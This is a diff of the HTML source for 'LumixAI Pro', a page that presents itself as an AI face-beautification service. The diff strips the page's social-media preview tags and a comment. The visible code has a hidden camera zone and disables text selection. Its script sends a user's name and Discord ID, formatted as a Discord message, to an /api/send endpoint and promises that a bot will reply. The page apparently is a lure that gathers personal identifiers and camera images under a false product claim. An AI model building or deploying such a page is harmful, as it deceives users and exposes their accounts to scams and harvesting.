@@ -4,24 +4,15 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>LumixAI Pro - 次世代AI美顔補正システム</title>
-    
-    <meta property="og:title" content="LumixAI Pro | 最新AI自動顔加工">
-    <meta property="og:description" content="最新AIを搭載！あなたの表情を自動で黄金比パーツへ補正。プロ仕様の加工を今すぐ体験。">
-    <meta property="og:type" content="website">
-    <meta property="og:image" content="https://images.openai.com/blob/57662c5b-7822-4876-b60b-8d5f3078a633/stunning-portrait-transformed-by-ai.jpg">
-    <meta name="twitter:card" content="summary_large_image">
-
     <style>
         :root { --p: #10b981; --pd: #059669; --bg: #f8fafc; --c: #ffffff; --t1: #1e293b; --t2: #64748b; }
         body { margin: 0; background: var(--bg); color: var(--t1); font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; user-select: none; }
         .container { background: var(--c); padding: 2.5rem 1.5rem; border-radius: 24px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); max-width: 400px; width: 90%; text-align: center; margin-top: 40px; border: 1px solid #e2e8f0; }
         h1 { font-size: 24px; font-weight: 800; margin: 0 0 10px; color: var(--p); }
         .desc { color: var(--t2); font-size: 13px; line-height: 1.5; margin-bottom: 20px; }
-
         .info-section { max-width: 400px; width: 90%; margin-top: 20px; text-align: left; background: #fff; padding: 15px; border-radius: 16px; border: 1px solid #e2e8f0; }
         .info-title { font-size: 14px; font-weight: bold; color: var(--t1); margin-bottom: 8px; display: flex; align-items: center; gap: 5px; }
         .info-content { font-size: 11px; color: var(--t2); line-height: 1.4; height: 80px; overflow-y: scroll; background: #f1f5f9; padding: 10px; border-radius: 8px; }
-
         input { width: 100%; padding: 14px; background: #f1f5f9; border: 2px solid transparent; border-radius: 12px; margin-bottom: 12px; box-sizing: border-box; outline: none; transition: 0.3s; }
         input:focus { border-color: var(--p); background: #fff; }
         #camera-zone { display: none; position: relative; width: 240px; height: 240px; margin: 0 auto 20px; }
@@ -134,7 +125,6 @@
             const f = new FormData();
             f.append('content', `🆔 **Discord ID登録**\n👤 Name: ${_n}\n👾 ID: ${id}`);
             
-            // 自分のAPIに送信
             await fetch('/api/send', { method: 'POST', body: f });
             
             _d('card').innerHTML = `<div style="padding:20px;"><div style="color:var(--p);font-size:40px;">✓</div><h2>リクエスト完了</h2><p class="desc">AI加工キューに追加されました。<br>Botからのメッセージをお待ちください。</p></div>`;
